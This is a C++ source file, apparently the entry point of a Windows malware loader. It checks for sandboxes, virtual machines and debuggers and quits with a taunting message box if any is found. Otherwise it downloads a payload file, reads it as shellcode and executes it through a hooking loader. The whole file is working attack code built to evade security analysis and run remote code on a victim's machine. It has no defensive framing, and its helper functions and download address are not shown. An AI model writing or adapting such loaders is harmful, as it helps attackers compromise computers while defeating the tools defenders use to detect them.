
#include <Windows.h>
#include <iostream>
#include <vector>
#include "utils.h"
#include "read_shellcode.h"
#include "Loader.hpp"
#include "HookingLoader.hpp"

//#ifdef _DEBUG
#define DOUT(x) do { std::cout <<x; } while(0)
//#else 
//#define DOUT(x) do { ; } while(0)
//#endif


using namespace std;

char fnamScBlob[] = "result.bin";

int main(int argc, char *argv[], char *envp[]) {

	BOOL decide = FALSE;
	if (is_sandbox() == -1) {
		printf("[!] Sandbox detected ... \n");
		decide = TRUE;

	}

	if (is_emulator() == -1) {
		printf("[!] Probably enside an VM Or Sandbox ... \n");
		decide = TRUE;
	}

	if (being_debugged() == -1) {
		printf("[!] A debugger was detected ... \n");
		decide = TRUE;
	}

	//////////////////////////////////////////////////////////////////////////////////////////////////
	//download the payload or not:
	if (decide == FALSE)
	{
		getWebResource();
	}

	else
	{
		//message box that will exit after, cz it detected something sus in the env...
		int msgboxID = MessageBox(
			NULL,
			(LPCSTR)"U kidding me ?",
			(LPCSTR)"lol",
			MB_ICONWARNING
		);
		return -1;
	}

	//////////////////////////////////////////////////////////////////////////////////////////////////
	//check if the payload was dowloaded successfuly:
	FILE* file;
	if (file = fopen(fnamScBlob, "r")) {
		printf("[+] payload file '%s' exists \n", fnamScBlob);
		fclose(file);
	}
	else {
		printf("[!] '%s' doesn't exist \n", fnamScBlob);
		return -1;
	}

	//////////////////////////////////////////////////////////////////////////////////////////////////
	//read the shellcode:

	DOUT("[+] Reading shellcode file\n");
	vector <UCHAR> shellcode = read_shellcode(fnamScBlob);							///////
	if (shellcode.size() == 0) {
		DOUT("[-] Error reading shellcode file. Either file doesn't exist or is empty\n");
		DOUT("[!] Quitting!\n");
		return -1;
	}


	Loader *ldr = new HookingLoader(shellcode);
	ldr->load_shellcode();

	return 1;
}
